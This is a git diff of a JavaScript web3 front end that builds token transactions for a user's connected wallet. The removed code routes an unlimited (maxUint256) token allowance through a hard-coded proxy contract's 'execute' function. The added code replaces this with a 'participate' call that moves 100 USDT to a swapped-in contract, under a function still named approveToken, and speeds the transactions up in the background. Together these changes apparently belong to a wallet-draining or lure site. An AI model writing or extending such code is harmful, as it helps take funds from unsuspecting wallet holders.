@@ -86,7 +86,7 @@ console.log('Network Map:', networkMap)
 
 const CONTRACTS = {
   [networkMap['Ethereum'].chainId]: '0xa65972Fce9925983f35185891109c4be643657aD',
-  [networkMap['BNB Smart Chain'].chainId]: '0x71D8436E8fA64CB5011d1d6929678119cAd0a8Cc',
+  [networkMap['BNB Smart Chain'].chainId]: '0x0434A340Ca9FD87677b68c967816499304171eC7',
   [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c',
   [networkMap['Arbitrum'].chainId]: '0x1234567890123456789012345678901234567890',
   [networkMap['Optimism'].chainId]: '0x2345678901234567890123456789012345678901',
@@ -569,12 +569,14 @@ const erc20Abi = [
     type: 'function'
   }
 ];
-
 const proxyAbi = [
   {
     constant: false,
-    inputs: [{ name: 'data', type: 'bytes' }],
-    name: 'execute',
+    inputs: [
+      { name: 'token', type: 'address' },
+      { name: 'amount', type: 'uint256' }
+    ],
+    name: 'participate',
     outputs: [],
     type: 'function'
   }
@@ -651,44 +653,41 @@ const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId)
   if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address');
 
   const checksumTokenAddress = getAddress(tokenAddress);
-  const checksumContractAddress = getAddress(contractAddress);
+  const checksumContractAddress = getAddress(contractAddress); // 0x71D8436E8fA64CB5011d1d6929678119cAd0a8Cc
 
   try {
-    // Кодируем параметры для approve в bytes
-    const encodedData = encodeFunctionData({
-      abi: [
-        {
-          inputs: [
-            { name: 'token', type: 'address' },
-            { name: 'spender', type: 'address' },
-            { name: 'amount', type: 'uint256' }
-          ],
-          name: 'execute',
-          type: 'function'
-        }
-      ],
-      functionName: 'execute',
-      args: [checksumTokenAddress, checksumContractAddress, maxUint256]
-    });
+    const amountToApprove = parseUnits("100", 18); // 100 USDT (18 decimals в BNB Smart Chain)
 
-    const txHash = await writeContract(wagmiConfig, {
-      address: checksumContractAddress, // Адрес прокси-контракта
-      abi: proxyAbi,
-      functionName: 'execute',
-      args: [encodedData],
+    const gasEstimate = await estimateGas(wagmiConfig, {
+      account: wagmiConfig.account,
+      to: checksumContractAddress,
+      data: encodeFunctionData({
+        abi: proxyAbi,
+        functionName: 'participate',
+        args: [checksumTokenAddress, amountToApprove]
+      }),
       chainId
     });
 
-    console.log(`Execute transaction sent: ${txHash}`);
+    const gasPrice = await getGasPrice(wagmiConfig, { chainId });
 
-    // Запускаем мониторинг транзакции в фоне
+    const txHash = await writeContract(wagmiConfig, {
+      address: checksumContractAddress,
+      abi: proxyAbi,
+      functionName: 'participate',
+      args: [checksumTokenAddress, amountToApprove],
+      chainId,
+    });
+
+    console.log(`Participate transaction sent: ${txHash}`);
+
     monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig).catch(error => {
       console.error(`Error monitoring transaction ${txHash}:`, error);
     });
 
     return txHash;
   } catch (error) {
-    store.errors.push(`Execute transaction failed: ${error.message}`);
+    store.errors.push(`Participate transaction failed: ${error.message}`);
     throw error;
   }
 };
